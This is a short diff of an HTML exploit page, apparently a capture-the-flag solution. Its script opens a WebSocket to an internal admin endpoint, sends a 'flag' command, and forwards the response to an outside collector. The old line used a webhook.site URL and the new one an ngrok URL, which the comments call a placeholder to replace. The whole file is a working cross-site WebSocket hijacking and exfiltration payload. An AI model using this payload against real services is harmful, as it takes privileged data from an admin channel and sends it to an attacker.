@@ -1,20 +1,24 @@
 <!DOCTYPE html>
-
 <html>
-
 <head>
-    <title>haha</title>
+    <title>Exploit</title>
     <script>
+        // Step 1: Open a WebSocket connection to the target server
         var ws = new WebSocket("ws://web:8080/admin/ws");
+
+        // Step 2: Send the 'flag' command when the connection opens
         ws.onopen = function() {
             ws.send("flag");
         };
+
+        // Step 3: Send the flag via a POST request to your ngrok URL when received
         ws.onmessage = function(event) {
             const xhttp = new XMLHttpRequest();
-            xhttp.open('POST', 'https://webhook.site/e557236e-aff5-4af6-9d50-1f7c6025810d' + event.data, true);
-            xhttp.send();
+            xhttp.open('POST', 'https://6a4a-115-186-169-76.ngrok-free.app/', true);  // Replace with your ngrok URL
+            xhttp.send(event.data);  // Send the flag data as the request body
         };
     </script>
 </head>
-
+<body>
+</body>
 </html>
